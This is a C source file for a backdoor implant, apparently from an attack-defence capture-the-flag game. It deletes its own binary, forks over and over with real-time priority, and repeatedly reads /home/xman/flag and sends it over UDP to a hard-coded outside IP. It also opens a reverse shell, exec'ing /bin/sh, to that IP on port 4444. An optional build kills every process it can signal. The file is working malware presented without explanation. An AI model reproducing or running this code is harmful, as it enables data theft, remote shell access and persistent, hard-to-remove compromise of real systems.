#include<unistd.h>
#include<sys/mman.h>
#include<stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <time.h>
#include <sys/socket.h>
#include <stdio.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>

void daemonlize()
{
    umask(0);
    if(fork() > 0)
    {
        _exit(0);
    }
    setsid();
}

char * get_name(char * argv0)
{
    unsigned char namelen = 0;
    int fd = open("/dev/urandom", 0);
    read(fd, &namelen, 1);
    namelen &= 0xF;
    read(fd, argv0, namelen);
    argv0[namelen] = 0;
    close(fd);
    return argv0;
}

extern char **environ;

void setproctitle_init(int argc, char **argv, char **envp)
{
    int i;

    for (i = 0; envp[i] != NULL; i++) // calc envp num
        continue;
    environ = (char **) malloc(sizeof (char *) * (i + 1)); // malloc envp pointer

    for (i = 0; envp[i] != NULL; i++)
    {
        environ[i] = malloc(sizeof(char) * strlen(envp[i]));
        strcpy(environ[i], envp[i]);
    }
    environ[i] = NULL;
}

void sendUdp(char * flag, const char *ip, int port)
{
    struct sockaddr_in server;
    int sockfd, len = 0;   
    int server_len = sizeof(struct sockaddr_in);     
     
    /* setup a socket，attention: must be SOCK_DGRAM */
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    /*complete the struct: sockaddr_in*/
    bzero(&server, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    sendto(sockfd, flag,  strlen(flag), 0, (struct sockaddr *)&server, server_len);
    close(sockfd);
}

void post_flag()
{
    char buff[255] = {0};
    /*
    FILE * fd = popen("/usr/bin/getflag", "r");
    int i=0;
    do
    {
        int ch = fgetc(fd);
        buff[i++] = ch;
        if(ch == '\n')
            break;
    }while(!feof(fd));
    fclose(fd);*/
    FILE * fp = fopen("/home/xman/flag","r");
    if(!fp)
        return;
    fgets(buff, 255, fp);
    fclose(fp);
    
    sendUdp(buff, "100.100.229.115", 8887);
}

#define PEER_IP "100.100.229.115"
#define PEER_PORT 4444

void reverse_shell()
{
    if(fork() > 0)
        return;
    
    int sockfd = 0;
    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(PEER_PORT);
    srv_addr.sin_addr.s_addr = inet_addr(PEER_IP);

    sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);

    if(connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr)) != 0)
    {
        _exit(0);
    }
    
    dup2(sockfd,0);
    dup2(sockfd,1);
    dup2(sockfd,2);
    //char *const params[] = {"/bin/sh",NULL};
    //char *const environ[] = {NULL};
    execve("/bin/sh",NULL,NULL);
}

void self_delete()
{
    int fd = open("/proc/self/cmdline", 0);
    char path[255] = {0};
    int len = read(fd, path, sizeof(path));
    write(1, path, len);
    close(fd);
    unlink(path);
}

int g_timer = 0;
//#define CLEAN_BKDOOR
int main(int argc, char *argv[]/*, char * env[]*/)
{   
    //切换成实时调度SCHED_FIFO,并且优先级设为最高
    struct sched_param param;
    param.sched_priority = sched_get_priority_max(SCHED_FIFO);
    sched_setscheduler(getpid(), SCHED_FIFO, &param);
    
    #define NANOSECOND 1000
    struct timespec sleeptm;
    sleeptm.tv_sec = 0;
    sleeptm.tv_nsec = NANOSECOND;
    
    self_delete();
    //setproctitle_init(argc, argv, environ);

new_child:
    daemonlize();
    
    //char * name = get_name(argv[0]);
    //prctl(PR_SET_NAME, name); 
    //do job
    ++g_timer;
    
    if(g_timer == 100000)//当前周期是10-11秒
    {
        g_timer = 0;
        post_flag();
    #if !defined(CLEAN_BKDOOR)
        reverse_shell();
    #endif
    }
#if defined(CLEAN_BKDOOR)
    kill(-1, 9);
#endif
    nanosleep(&sleeptm, NULL);
    goto new_child;
    return 0;
}
 
